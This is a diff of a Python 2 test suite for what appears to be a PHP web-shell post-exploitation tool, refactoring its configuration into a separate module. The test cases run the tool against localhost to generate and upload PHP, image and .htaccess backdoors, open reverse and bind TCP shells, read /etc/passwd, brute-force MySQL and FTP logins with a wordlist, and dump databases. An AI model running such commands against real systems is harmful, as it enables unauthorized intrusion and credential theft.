@@ -1,73 +1,17 @@
 from commands import getstatusoutput as run
-from os import system as run_bg, getenv, remove
+from os import system as run_bg, remove
 from re import search, DOTALL
 from sys import argv
 import types
 from commands import getstatusoutput
+from testconf import scripts
 
 class TestException(Exception):
     pass
 
-host = 'http://localhost'
-url = '%s/we.php' % host
-pwd = 'asdasd'
-urlpwd = '%s %s' % (url, pwd)
-writable_dir = 'writable'
-http_proxy = "http://localhost:8080"
-bd_tcp_port = 9090
-mysql_user = 'root'
-mysql_pwd = 'root'
-ftp_user = 'weev-test'
-ftp_pwd = 'weev-test'
-#remote_page = 'http://www.google.com'
-remote_page = 'http://localhost/google.html'
+from testconf import host, url, pwd, urlpwd, writable_dir, http_proxy, bd_tcp_port, mysql_user, mysql_pwd, ftp_user
+from testconf import ftp_pwd, remote_page, home, readable_file_in_home_directory
 
-
-home = getenv("HOME")
-if home[-1] == '/': home = home[:-1]
-readable_file_in_home_directory = "%s/.bash_history" % home
-
-
-
-scripts = {
-           
-           '/tmp/tempscript' : """# comment
-:shell.php 'print("OK test");'
-""",
-
-            '/tmp/proxyscript' : """:set shell.php proxy='%s'
-:shell.php 'print("OK test");'
-:system.info client_ip
-""" % (http_proxy),
-
-            '/tmp/proxybrokescript' : """:set shell.php proxy='%s'
-:shell.php 'print("OK test");'
-""" % (http_proxy[:-1]),
-
-            '/tmp/enumlist' : """/etc/motd
-/etc/dasadas
-/lkj/kjhkjlh
-/boot/lkjlsdaassad
-/etc/passwd
-""" ,
-
-
-            '/tmp/wordlist' : """pass
-pass1
-pass2
-admin
-asdasd
-thisiswrongpassword
-kjdsa
-#comment?
-%s
-asd
-%s
-""" % (ftp_pwd, mysql_pwd),
-
-            '/tmp/image.gif' : 'http://upload.wikimedia.org/wikipedia/commons/4/4b/Empty.gif'
-           
-           }
 
 
 class TG(list):
@@ -76,9 +20,7 @@ class TG(list):
         
         self.name = name
         self.description = description
-        
         list.__init__(self)
-        
         self.extend(TCs)
 
         
@@ -88,6 +30,10 @@ class TG(list):
         
         for tc in self:
             tc.test()
+
+
+
+
 
 class TC:
     def __init__(self, params, expected_output, expected_status = None, negate=False, printout=False, background=False):
@@ -144,252 +90,258 @@ class TC:
         
         if self.printout:
             print self.outp_format(output)
-           
-        
 
-
-TS = [
-      
-      TG('show', 'Test "show"',
-        [
-        TC([ 'show',  'generate.asd' ],'Error'),                # show with existant mod
-        TC([ 'show', 'sql.dump' ],'Error', negate=True),        # show good mod
-        TC([ 'show', ':sql.dump' ],'Error', negate=True),       # show good :mod
-        TC([ urlpwd, ':show sql.dump' ],'Error', negate=True),   # show good mod cmdline
-        TC([ urlpwd, ':show :sql.dump' ],'Error', negate=True),   # show good :mod cmdline
-        TC([ urlpwd[3:], ':show sql.dump' ],'Error', negate=True)   # show wrong url cmdline
-        ]),
-      
-      TG('set', 'Test "set"',
-        [
-        TC([ urlpwd, ':set shell.sh cmd\=ls' ],'cmd=ls'),   # set variable with =
-        TC([ urlpwd, ':set shell.sh ls' ],'cmd=ls'),   # set variable without =
-        TC([ urlpwd, ':set shell.php debug=True ' ],'\[debug=True\]'),   
-        TC([ urlpwd, ':set sad.asd.ds debug=True' ],'Error')   # set with non existant mod
-        ]),
-
-      TG('load', 'Test "load"',
-        [
-        TC([ urlpwd, ':load /tmp/tempscript' ],'\nOK test'),   # load working script
-        TC([ urlpwd[:-1], ':load /tmp/tempscript' ],'\nOK test', negate=True),   # bad connection
-        TC([ urlpwd, ':load /tmp/asd' ],'Error opening'),   # load unexistant script
-        ]),
-      
-      
-      TG('fname', 'Test "find.name"',
-        [
-        TC([ urlpwd, ':find.name ci %s .' % (writable_dir[2:-1].upper())], writable_dir),   # find if contains case insensitive
-        TC([ urlpwd, ':find.name c %s' % (writable_dir[2:-1]) ], writable_dir),   # find if contains 
-        TC([ urlpwd, ':find.name ei %s' % (writable_dir.upper()) ], writable_dir),   # find if equal case insensitive
-        TC([ urlpwd, ':find.name e %s' % (writable_dir) ], writable_dir),   # find if equal 
-        TC([ urlpwd, ':find.name ci ESOLV.CONF /etc/' ], 'resolv.conf'),   # find if contains case insensitive out of webroot
-        ]),
-      
-      TG('fperms', 'Test "find.perms"',
-        [
-        TC([ urlpwd, ':find.perms first d w vector=ndee' ], 'Error, allowed values'),   # find with wrong vector
-        TC([ urlpwd, ':find.perms first d w vector=find' ], writable_dir),   # find first writable dir
-        TC([ urlpwd, ':find.perms any f x /sbin/ vector=find' ], 'insmod'),   # find executable directory in /sbin/
-        TC([ urlpwd, ':find.perms any f r /etc/' ], 'passwd')   # find any readable files
-        ]),      
-      
-      TG('proxy', 'Run background :net.proxy, set and use it to connect through',
-        [
-        TC([ urlpwd, ':net.proxy' ],'', background=True),   # start proxy in background
-        TC([ urlpwd, ':load /tmp/proxyscript' ],'\nOK test'),   # execute some command through proxy
-        TC([ urlpwd, ':load /tmp/proxybrokescript' ],'Connection refused'),   # set wrong proxy
-        ]),      
-      
-      TG('backdoor', 'Open TCP backdoors and check',
-        [
-        TC([ urlpwd, ':backdoor.reverse_tcp localhost %i' % (bd_tcp_port) ], '', background=True),   # open reverse tcp shell in background
-        TC([ urlpwd, ':backdoor.tcp %i' % bd_tcp_port ],'', background=True),   # connect with direct tcp 
-        TC([ urlpwd, '"netstat -ap | grep %i"' % bd_tcp_port ],'.*\*:%i.*LISTEN.*localhost:%i.*ESTABLISHED.*localhost:%i.*ESTABLISHED.*' % (bd_tcp_port, bd_tcp_port, bd_tcp_port)) # check with netstat
-        ]),
-
-      TG('etc_passwd', 'Audit etc_passwd',
-        [
-        TC([ urlpwd, ':audit.etc_passwd vector=posix_getpwuid' ], ':daemon:/usr/sbin:'), 
-        TC([ urlpwd, ':audit.etc_passwd filter=True vector=fileread' ], ':daemon:/usr/sbin:', negate=True) 
-        ]),
-      
-      TG('read', 'Read remote file',
-        [
-        TC([ urlpwd, ':file.read /etc/passwd' ], ':daemon:/usr/sbin:'), 
-        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=base64' ], ':daemon:/usr/sbin:'), 
-        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=copy' ], ':daemon:/usr/sbin:'), 
-        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=symlink' ], ':daemon:/usr/sbin:'),
-        TC([ urlpwd, ':file.read rpath=asdasd vector=symlink' ], 'File read failed')
-        ]),
-      
-      TG('upload', 'Upload file',
-        [
-        TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'File.*uploaded'),
-        TC([ urlpwd, ':file.upload /etc/motd lkjh/lkj' ], 'creation failed'), 
-        TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'already exists.*File.*uploaded'),
-        TC([ urlpwd, ':file.upload /etc/mot kjhkjlh' ], 'Open file \'/etc/mot\' failed'),
-        ]),
-      
-      TG('enum', 'Enumerate files',
-        [
-        TC([ urlpwd, ':file.enum /tmp/enumlist' ], '/etc/motd.*/etc/passwd')
-        ]),
-      
-      
-      TG('scan', 'Network scanning',
-        [
-        TC([ urlpwd, ':net.scan localhost 12,30,40,70-90,2555' ], 'OPEN: 127.0.0.1:80'),
-        #TC([ urlpwd, ':net.scan www.google.it,localhost 12,30,40,70-90,2555' ], 'OPEN: .*:80.*OPEN: 127.0.0.1:80'),
-        TC([ urlpwd, ':net.scan localhost 12,30' ], 'OPEN', negate=True)
-        ]),
-      
-      TG('brutesql', 'SQL forcing',
-        [
-        TC([ urlpwd, ':bruteforce.sql mysql %s /tmp/wordlist' % (mysql_user) ], 'FOUND! \(%s:%s\)' % (mysql_user, mysql_pwd)),
-        TC([ urlpwd, ':bruteforce.sql_users mysql /tmp/wordlist filtered.com' ], 'Check dbms availability'),
-        TC([ urlpwd, ':bruteforce.sql mysql user /tmp/wordlist all nonexistant.host' ], 'Check dbms availability'),
-        TC([ urlpwd, ':bruteforce.sql_users mysql /tmp/wordlist' ], 'FOUND! \(%s:%s\)' % (mysql_user, mysql_pwd)),
-        TC([ urlpwd, ':bruteforce.sql postgres %s /tmp/wordlist' % (mysql_user) ], 'pg_connect not available'),
-        TC([ urlpwd, ':bruteforce.sql mysql blabla /tmp/wordlist' ], 'Password of \'blabla\' not found'),
-        
-        ]),
-
-      TG('bruteftp', 'FTP forcing',
-        [
-        TC([ urlpwd, ':bruteforce.ftp %s /tmp/wordlist' % (ftp_user) ], 'FOUND! \(%s:%s\)' % (ftp_user, ftp_pwd)),
-        TC([ urlpwd, ':bruteforce.ftp_users /tmp/wordlist' ], 'FOUND! \(%s:%s\)' % (ftp_user, ftp_pwd)),
-        TC([ urlpwd, ':bruteforce.ftp user /tmp/wordlist all filtered.com 22' ], 'service not available'),
-        TC([ urlpwd, ':bruteforce.ftp user /tmp/wordlist all notexistant.host' ], 'service not available'),
-        TC([ urlpwd, ':bruteforce.ftp %s /tmp/wordlista' % (mysql_user) ], 'No such file or directory'),
-        TC([ urlpwd, ':bruteforce.ftp blabla /tmp/wordlist' ], 'Password of \'blabla\' not found'),
-        ]),
-      
-      
-      TG('sql', 'SQL',
-        [
-
-        TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;" filtered.com' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),
-        TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;" nonexistant.host' % (mysql_user, mysql_pwd) ], ['using default', 'check credential'] ),
-        TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;"' % (mysql_user, mysql_pwd) ], 'information_schema' ),
-        TC([ urlpwd, ':sql.query mysql %s %s "WRONG_CMD"' % (mysql_user, mysql_pwd) ], 'check credential' ),        
-        
-        # Good with mysqldump and mysqlphpdump
-        TC([ urlpwd, ':sql.dump mysql %s %s information_schema vector=mysqlphpdump' % (mysql_user, mysql_pwd) ], 'Saving \'.*\' dump' ),        
-        TC([ urlpwd, ':sql.dump mysql %s %s information_schema vector=mysqldump' % (mysql_user, mysql_pwd) ], 'Saving \'.*\' dump' ),        
-        
-        # Bad with mysqlphpdump
-        TC([ urlpwd, ':sql.dump mysql Asd asd information_schema vector=mysqlphpdump' ], ['using default', 'check credential' ] ), 
-        TC([ urlpwd, ':sql.dump mysql %s %s baddb vector=mysqlphpdump' % (mysql_user, mysql_pwd) ], 'check credential' ),        
-        
-        #Bad with mysqldump
-        TC([ urlpwd, ':sql.dump mysql %s %swrong information_schema vector=mysqldump' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),        
-        TC([ urlpwd, ':sql.dump mysql %s %s baddb vector=mysqldump' % (mysql_user, mysql_pwd) ], 'check credential'  ),        
-
-        #Summary good
-        TC([ urlpwd, ':sql.summary mysql %s %s information_schema' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ], negate=True ),
-        TC([ urlpwd, ':sql.summary mysql %s %swrong information_schema filtered.com' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),
-        TC([ urlpwd, ':sql.summary mysql %swrong %s information_schema nonexistant.host' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ]  ),
-        TC([ urlpwd, ':sql.summary mysql %s %s baddb' % (mysql_user, mysql_pwd) ], [ 'check credential' ]  ),
-
-        ]),
-
-
-      TG('generatephp', 'Generate and upload PHP backdoor',
-        [
-        TC([ 'generate password /tmp/testbd.php' ], 'Backdoor file \'/tmp/testbd.php\' created with password \'password\''),
-        TC([ urlpwd, ':file.upload /tmp/testbd.php %s/testbd.php' % writable_dir ], 'File.*uploaded'),
-        TC([ '%s/%s/testbd.php password' % (host, writable_dir), ':system.info os' ], 'Linux'),
-        TC([ '%s/%s/testbd.php password' % (host, writable_dir), 'rm testbd.php' ], ''),
-        TC([ '%s/%s/testbd.php password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
-        ]),
-      
-        TG('generateimg', 'Generate and upload backdoor embedded in image',
-        [
-        TC([ 'generate.img password /tmp/image.gif /tmp/generated-image/' ], 'created with password \'password\''),
-        TC([ urlpwd, ':file.upload /tmp/generated-image/image.gif %s/image.gif' % (writable_dir) ], 'File.*uploaded'),
-        TC([ urlpwd, ':file.upload /tmp/generated-image/.htaccess %s/.htaccess' % (writable_dir) ], 'File.*uploaded'),
-        TC([ '%s/%s/image.gif password' % (host, writable_dir), ':system.info os' ], 'Linux'),
-        TC([ urlpwd, 'rm %s/.htaccess' % (writable_dir)], ''),
-        TC([ '%s/%s/image.gif password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
-        TC([ urlpwd, 'rm %s/image.gif' % (writable_dir)], ''),
-        ]),
-
-        TG('generateht', 'Generate and upload htaccess backdoor',
-        [
-        TC([ 'generate.htaccess password /tmp/htaccess' ], 'created with password \'password\''),
-        TC([ urlpwd, ':file.upload /tmp/htaccess %s/.htaccess' % (writable_dir) ], 'File.*uploaded'),
-        TC([ '%s/%s/.htaccess password' % (host, writable_dir), ':system.info os' ], 'Linux'),
-        TC([ urlpwd, 'rm %s/.htaccess' % (writable_dir)], ''),
-        TC([ '%s/%s/.htaccess password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
-        ]),
-      
-	TG('phpproxy', 'Upload and test phpproxy',
-        [
-        TC([ urlpwd, ':net.php_proxy' ], 'proxy.*uploaded'),
-        TC([ urlpwd, 'curl "%s/%s/weepro.php?u=%s"' % (host, writable_dir, remote_page) ], '<title>Google</title>'),
-        ]),
-      
-
-      # TODO: fare l'rm e cancellare tutti i file temporanei
-      # Aggiungere il vettore sql da console (magari nn e installato il modulo per php)
-      # Nell'help di generate non si capisce dove si mette la pwd
-      
-      ]       
     
-def restore_enviroinment():
-    for script_path in scripts:
-        remove(script_path)
-        
-    print '[+] Deleted script files: "%s"' % '", "'.join(scripts.keys())
+
+
+class TestSuite:
+
+
+    TS = [
+          
+          TG('show', 'Test "show"',
+            [
+            TC([ 'show',  'generate.asd' ],'Error'),                # show with existant mod
+            TC([ 'show', 'sql.dump' ],'database dump'),        # show good mod
+            TC([ 'show', ':sql.dump' ],'database dump'),       # show good :mod
+            TC([ urlpwd, ':show sql.dump' ],'database dump'),   # show good mod cmdline
+            TC([ urlpwd, ':show :sql.dump' ],'database dump'),   # show good :mod cmdline
+            TC([ urlpwd[3:], ':show sql.dump' ],'database dump')   # show wrong url cmdline
+            ]),
+          
+          TG('set', 'Test "set"',
+            [
+            TC([ urlpwd, ':set shell.sh cmd\=ls' ],'cmd=ls'),   # set variable with =
+            TC([ urlpwd, ':set shell.sh ls' ],'cmd=ls'),   # set variable without =
+            TC([ urlpwd, ':set shell.php debug=True ' ],'\[debug=True\]'),   
+            TC([ urlpwd, ':set sad.asd.ds debug=True' ],'Error')   # set with non existant mod
+            ]),
     
+          TG('load', 'Test "load"',
+            [
+            TC([ urlpwd, ':load /tmp/tempscript' ],'\nOK test'),   # load working script
+            TC([ urlpwd[:-1], ':load /tmp/tempscript' ],'\nOK test', negate=True),   # bad connection
+            TC([ urlpwd, ':load /tmp/asd' ],'Error opening'),   # load unexistant script
+            ]),
+          
+          
+          TG('fname', 'Test "find.name"',
+            [
+            TC([ urlpwd, ':find.name ci %s .' % (writable_dir[2:-1].upper())], writable_dir),   # find if contains case insensitive
+            TC([ urlpwd, ':find.name c %s' % (writable_dir[2:-1]) ], writable_dir),   # find if contains 
+            TC([ urlpwd, ':find.name ei %s' % (writable_dir.upper()) ], writable_dir),   # find if equal case insensitive
+            TC([ urlpwd, ':find.name e %s' % (writable_dir) ], writable_dir),   # find if equal 
+            TC([ urlpwd, ':find.name ci ESOLV.CONF /etc/' ], 'resolv.conf'),   # find if contains case insensitive out of webroot
+            ]),
+          
+          TG('fperms', 'Test "find.perms"',
+            [
+            TC([ urlpwd, ':find.perms first d w vector=ndee' ], 'Error, allowed values'),   # find with wrong vector
+            TC([ urlpwd, ':find.perms first d w vector=find' ], writable_dir),   # find first writable dir
+            TC([ urlpwd, ':find.perms any f x /sbin/ vector=find' ], 'insmod'),   # find executable directory in /sbin/
+            TC([ urlpwd, ':find.perms any f r /etc/' ], 'passwd')   # find any readable files
+            ]),      
+          
+          TG('proxy', 'Run background :net.proxy, set and use it to connect through',
+            [
+            TC([ urlpwd, ':net.proxy' ],'', background=True),   # start proxy in background
+            TC([ urlpwd, ':load /tmp/proxyscript' ],'\nOK test'),   # execute some command through proxy
+            TC([ urlpwd, ':load /tmp/proxybrokescript' ],'Connection refused'),   # set wrong proxy
+            ]),      
+          
+          TG('backdoor', 'Open TCP backdoors and check',
+            [
+            TC([ urlpwd, ':backdoor.reverse_tcp localhost %i' % (bd_tcp_port) ], '', background=True),   # open reverse tcp shell in background
+            TC([ urlpwd, ':backdoor.tcp %i' % bd_tcp_port ],'', background=True),   # connect with direct tcp 
+            TC([ urlpwd, '"netstat -ap | grep %i"' % bd_tcp_port ],'.*\*:%i.*LISTEN.*localhost:%i.*ESTABLISHED.*localhost:%i.*ESTABLISHED.*' % (bd_tcp_port, bd_tcp_port, bd_tcp_port)) # check with netstat
+            ]),
     
-    
-def initialize_enviroinment():
-    
-    for script_path in scripts:
-        if scripts[script_path].startswith('http'):
+          TG('etc_passwd', 'Audit etc_passwd',
+            [
+            TC([ urlpwd, ':audit.etc_passwd vector=posix_getpwuid' ], ':daemon:/usr/sbin:'), 
+            TC([ urlpwd, ':audit.etc_passwd filter=True vector=fileread' ], ':daemon:/usr/sbin:', negate=True) 
+            ]),
+          
+          TG('read', 'Read remote file',
+            [
+            TC([ urlpwd, ':file.read /etc/passwd' ], ':daemon:/usr/sbin:'), 
+            TC([ urlpwd, ':file.read rpath=/etc/passwd vector=base64' ], ':daemon:/usr/sbin:'), 
+            TC([ urlpwd, ':file.read rpath=/etc/passwd vector=copy' ], ':daemon:/usr/sbin:'), 
+            TC([ urlpwd, ':file.read rpath=/etc/passwd vector=symlink' ], ':daemon:/usr/sbin:'),
+            TC([ urlpwd, ':file.read rpath=asdasd vector=symlink' ], 'File read failed')
+            ]),
+          
+          TG('upload', 'Upload file',
+            [
+            TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'File.*uploaded'),
+            TC([ urlpwd, ':file.upload /etc/motd lkjh/lkj' ], 'creation failed'), 
+            TC([ urlpwd, ':file.upload /etc/motd %s/asd' % writable_dir ], 'already exists.*File.*uploaded'),
+            TC([ urlpwd, ':file.upload /etc/mot kjhkjlh' ], 'Open file \'/etc/mot\' failed'),
+            ]),
+          
+          TG('enum', 'Enumerate files',
+            [
+            TC([ urlpwd, ':file.enum /tmp/enumlist' ], '/etc/motd.*/etc/passwd')
+            ]),
+          
+          
+          TG('scan', 'Network scanning',
+            [
+            TC([ urlpwd, ':net.scan localhost 12,30,40,70-90,2555' ], 'OPEN: 127.0.0.1:80'),
+            #TC([ urlpwd, ':net.scan www.google.it,localhost 12,30,40,70-90,2555' ], 'OPEN: .*:80.*OPEN: 127.0.0.1:80'),
+            TC([ urlpwd, ':net.scan localhost 12,30' ], 'OPEN', negate=True)
+            ]),
+          
+          TG('brutesql', 'SQL forcing',
+            [
+            TC([ urlpwd, ':bruteforce.sql mysql %s /tmp/wordlist' % (mysql_user) ], 'FOUND! \(%s:%s\)' % (mysql_user, mysql_pwd)),
+            TC([ urlpwd, ':bruteforce.sql_users mysql /tmp/wordlist filtered.com' ], 'Check dbms availability'),
+            TC([ urlpwd, ':bruteforce.sql mysql user /tmp/wordlist all nonexistant.host' ], 'Check dbms availability'),
+            TC([ urlpwd, ':bruteforce.sql_users mysql /tmp/wordlist' ], 'FOUND! \(%s:%s\)' % (mysql_user, mysql_pwd)),
+            TC([ urlpwd, ':bruteforce.sql postgres %s /tmp/wordlist' % (mysql_user) ], 'pg_connect not available'),
+            TC([ urlpwd, ':bruteforce.sql mysql blabla /tmp/wordlist' ], 'Password of \'blabla\' not found'),
             
-            getstatusoutput('wget %s -O %s' % (scripts[script_path], script_path))
+            ]),
+    
+          TG('bruteftp', 'FTP forcing',
+            [
+            TC([ urlpwd, ':bruteforce.ftp %s /tmp/wordlist' % (ftp_user) ], 'FOUND! \(%s:%s\)' % (ftp_user, ftp_pwd)),
+            TC([ urlpwd, ':bruteforce.ftp_users /tmp/wordlist' ], 'FOUND! \(%s:%s\)' % (ftp_user, ftp_pwd)),
+            TC([ urlpwd, ':bruteforce.ftp user /tmp/wordlist all filtered.com 22' ], 'service not available'),
+            TC([ urlpwd, ':bruteforce.ftp user /tmp/wordlist all notexistant.host' ], 'service not available'),
+            TC([ urlpwd, ':bruteforce.ftp %s /tmp/wordlista' % (mysql_user) ], 'No such file or directory'),
+            TC([ urlpwd, ':bruteforce.ftp blabla /tmp/wordlist' ], 'Password of \'blabla\' not found'),
+            ]),
+          
+          
+          TG('sql', 'SQL',
+            [
+    
+            TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;" filtered.com' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),
+            TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;" nonexistant.host' % (mysql_user, mysql_pwd) ], ['using default', 'check credential'] ),
+            TC([ urlpwd, ':sql.query mysql %s %s "SHOW DATABASES;"' % (mysql_user, mysql_pwd) ], 'information_schema' ),
+            TC([ urlpwd, ':sql.query mysql %s %s "WRONG_CMD"' % (mysql_user, mysql_pwd) ], 'check credential' ),        
             
-        else:
-            fscript = file(script_path,'w')
-            fscript.write(scripts[script_path])
-            fscript.close()
-        
-    print '[+] Created script files: "%s"' % '", "'.join(scripts.keys())
+            # Good with mysqldump and mysqlphpdump
+            TC([ urlpwd, ':sql.dump mysql %s %s information_schema vector=mysqlphpdump' % (mysql_user, mysql_pwd) ], 'Saving \'.*\' dump' ),        
+            TC([ urlpwd, ':sql.dump mysql %s %s information_schema vector=mysqldump' % (mysql_user, mysql_pwd) ], 'Saving \'.*\' dump' ),        
+            
+            # Bad with mysqlphpdump
+            TC([ urlpwd, ':sql.dump mysql Asd asd information_schema vector=mysqlphpdump' ], ['using default', 'check credential' ] ), 
+            TC([ urlpwd, ':sql.dump mysql %s %s baddb vector=mysqlphpdump' % (mysql_user, mysql_pwd) ], 'check credential' ),        
+            
+            #Bad with mysqldump
+            TC([ urlpwd, ':sql.dump mysql %s %swrong information_schema vector=mysqldump' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),        
+            TC([ urlpwd, ':sql.dump mysql %s %s baddb vector=mysqldump' % (mysql_user, mysql_pwd) ], 'check credential'  ),        
+    
+            #Summary good
+            TC([ urlpwd, ':sql.summary mysql %s %s information_schema' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ], negate=True ),
+            TC([ urlpwd, ':sql.summary mysql %s %swrong information_schema filtered.com' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ] ),
+            TC([ urlpwd, ':sql.summary mysql %swrong %s information_schema nonexistant.host' % (mysql_user, mysql_pwd) ], ['using default', 'check credential' ]  ),
+            TC([ urlpwd, ':sql.summary mysql %s %s baddb' % (mysql_user, mysql_pwd) ], [ 'check credential' ]  ),
+    
+            ]),
+    
+    
+          TG('generatephp', 'Generate and upload PHP backdoor',
+            [
+            TC([ 'generate password /tmp/testbd.php' ], 'Backdoor file \'/tmp/testbd.php\' created with password \'password\''),
+            TC([ urlpwd, ':file.upload /tmp/testbd.php %s/testbd.php' % writable_dir ], 'File.*uploaded'),
+            TC([ '%s/%s/testbd.php password' % (host, writable_dir), ':system.info os' ], 'Linux'),
+            TC([ '%s/%s/testbd.php password' % (host, writable_dir), 'rm testbd.php' ], ''),
+            TC([ '%s/%s/testbd.php password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
+            ]),
+          
+            TG('generateimg', 'Generate and upload backdoor embedded in image',
+            [
+            TC([ 'generate.img password /tmp/image.gif /tmp/generated-image/' ], 'created with password \'password\''),
+            TC([ urlpwd, ':file.upload /tmp/generated-image/image.gif %s/image.gif' % (writable_dir) ], 'File.*uploaded'),
+            TC([ urlpwd, ':file.upload /tmp/generated-image/.htaccess %s/.htaccess' % (writable_dir) ], 'File.*uploaded'),
+            TC([ '%s/%s/image.gif password' % (host, writable_dir), ':system.info os' ], 'Linux'),
+            TC([ urlpwd, 'rm %s/.htaccess' % (writable_dir)], ''),
+            TC([ '%s/%s/image.gif password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
+            TC([ urlpwd, 'rm %s/image.gif' % (writable_dir)], ''),
+            ]),
+    
+            TG('generateht', 'Generate and upload htaccess backdoor',
+            [
+            TC([ 'generate.htaccess password /tmp/htaccess' ], 'created with password \'password\''),
+            TC([ urlpwd, ':file.upload /tmp/htaccess %s/.htaccess' % (writable_dir) ], 'File.*uploaded'),
+            TC([ '%s/%s/.htaccess password' % (host, writable_dir), ':system.info os' ], 'Linux'),
+            TC([ urlpwd, 'rm %s/.htaccess' % (writable_dir)], ''),
+            TC([ '%s/%s/.htaccess password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
+            ]),
+          
+        TG('phpproxy', 'Upload and test phpproxy',
+            [
+            TC([ urlpwd, ':net.php_proxy' ], 'proxy.*uploaded'),
+            TC([ urlpwd, 'curl "%s/%s/weepro.php?u=%s"' % (host, writable_dir, remote_page) ], '<title>Google</title>'),
+            ]),
+          
+    
+          # TODO: fare l'rm e cancellare tutti i file temporanei
+          # Aggiungere il vettore sql da console (magari nn e installato il modulo per php)
+          
+          ]       
 
-       
-def parse_testlist_parameters():
     
-    tslist = []
-    if len(argv) >= 2:
-        for par in argv[1:]:
-            if par.isdigit():
-                tslist.append(int(par))
-            else:
-                tslist.append(par)
-    else:
-        print '[TESTSUITE] Specify tests or \'all\'. Available tests:\n[TESTSUITE] "%s"' % ('", "'.join([tg.name for tg in TS]))
-    
-    return tslist
-       
-       
-def run_tests(tslist):
-    try:
-        i = 0
-        for ts in TS:       
-            if 'all' in tslist or ts.name in tslist or i in tslist:
-                ts.test()
+    def restore_enviroinment(self):
+        for script_path in scripts:
+            remove(script_path)
+            
+        print '[+] Deleted script files: "%s"' % '", "'.join(scripts.keys())
+        
+        
+        
+    def initialize_enviroinment(self):
+        
+        for script_path in scripts:
+            if scripts[script_path].startswith('http'):
                 
-            i+=1
-    except TestException, e:
-        print '[!] %s' % str(e)
+                getstatusoutput('wget %s -O %s' % (scripts[script_path], script_path))
+                
+            else:
+                fscript = file(script_path,'w')
+                fscript.write(scripts[script_path])
+                fscript.close()
+            
+        print '[+] Created script files: "%s"' % '", "'.join(scripts.keys())
     
+           
+    def parse_testlist_parameters(self):
+        
+        tslist = []
+        if len(argv) >= 2:
+            for par in argv[1:]:
+                if par.isdigit():
+                    tslist.append(int(par))
+                else:
+                    tslist.append(par)
+        else:
+            print '[TESTSUITE] Specify tests or \'all\'. Available tests:\n[TESTSUITE] "%s"' % ('", "'.join([tg.name for tg in self.TS]))
+        
+        return tslist
+           
+           
+    def run_tests(self,tslist):
+        try:
+            i = 0
+            for ts in self.TS:       
+                if 'all' in tslist or ts.name in tslist or i in tslist:
+                    ts.test()
+                    
+                i+=1
+        except TestException, e:
+            print '[!] %s' % str(e)
+
+    def __init__(self):
+        
+        tslist = self.parse_testlist_parameters()
+        if tslist:
+            self.initialize_enviroinment()
+            self.run_tests(tslist)
+            self.restore_enviroinment()
+
     
 if __name__ == "__main__":
-    
-    tslist = parse_testlist_parameters()
-    if tslist:
-        initialize_enviroinment()
-        run_tests(tslist)
-        restore_enviroinment()
+    TestSuite()
